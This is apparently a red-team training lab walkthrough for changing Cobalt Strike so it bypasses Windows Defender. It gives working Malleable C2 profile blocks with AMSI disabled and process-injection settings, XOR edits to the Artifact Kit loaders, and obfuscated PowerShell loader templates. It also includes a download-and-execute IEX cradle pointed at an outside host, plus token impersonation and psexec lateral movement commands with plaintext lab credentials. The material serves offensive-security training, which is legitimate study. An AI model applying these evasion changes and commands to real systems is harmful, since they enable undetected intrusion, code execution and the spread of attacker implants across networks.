# Defence Evasion Lab - Malleable C2  

## Instruction Commands

Open a new PowerShell window in Terminal.

SSH into the team server VM.
```
ssh attacker@10.0.0.5
```  
The password is `Passw0rd!`
Move into the profiles directory.
```
cd /opt/cobaltstrike/profiles
```  
Open default.profile in a text editor (e.g. vim or nano).

Add the following stage block:

```
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```  

Add the following post-ex block:

```
post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

Add the following process-inject block:

```
process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```
Save the changes.

<img src="/images/defence-evasion-lab-01.png" width=1024>  

Restart the team server.
```
sudo /usr/bin/docker restart cobaltstrike-cs-1
```
Check the container logs to ensure there are no profile errors.
```
sudo /usr/bin/docker logs cobaltstrike-cs-1
```  

## Artifact Kit

Launch Visual Studio Code.

Go to File > Open Folder and select C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

Navigate to src-common and open patch.c.

Scroll to line ~45 and modify the for loop. This is for the svc exe payloads.

```c
x = length;
while ( x-- ) {
  * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```
Scroll to line ~116 and modify the other for loop. This is for the normal exe payloads.

```c
int x = length;
while ( x-- ) {
  * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```
Save the changes (File > Save) and close the folder (File > Close Folder).

On the Windows taskbar, right-click on the Terminal icon and launch Ubuntu WSL.

Change the working directory.

cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
Run build.sh to build the new artifacts.

```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```  

Load the Aggressor Script.

Open the Cobalt Strike client.
Go to Cobalt Strike > Script Manager.
Click Load.
Navigate to `C:\Tools\cobaltstrike\custom-artifacts\mailslot` and select `artifact.cna`.  

<img src="/images/defence-evasion-lab-02.png" width=1024>

## Resource Kit  

>launch Ubuntu WSL from the Windows Terminal.

Change the working directory.
```
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
```  

Run build.sh to copy the resource templates.  

```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```  

If not already open from the previous task, launch Visual Studio Code.

Go to File > Open Folder and select `C:\Tools\cobaltstrike\custom-resources`.

Select `template.x64.ps1`.

<img src="/images/defence-evasion-lab-03.png" width=1024>  

Scroll to line 5 and replace .Equals('System.dll') with .Equals('Sys'+'tem.dll').

Scroll to line 32 and replace it with:

```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```  

Save the changes (File > Save).

Select `compress.ps1`.

Use `Invoke-Obfuscation` to create a unique obfuscated version, or try the following:

```PowerShell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```
Save the changes (File > Save).

Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.

## Testing
Host a 64-bit PowerShell payload.

Go to Attacks > Scripted Web Delivery
Select the http listener.
Click Launch.
Switch to Workstation and login with Passw0rd!.

Open a PowerShell window.

Download and invoke the PowerShell payload.

```PowerShell
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
```  

Switch back to Attacker Desktop and a new Beacon should be checking in.

From the new Beacon, impersonate a local admin to lon-ws-1.
```
make_token CONTOSO\rsteel Passw0rd!
```  

Change the spawnto for the service payload.
```
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```  

Move laterally to lon-ws-1.
```
jump psexec64 lon-ws-1 smb
```

>In this lab, you have bypasses Windows Defender by modifying Cobalt Strike's default artifacts, resources, and post-exploitation behaviours.  

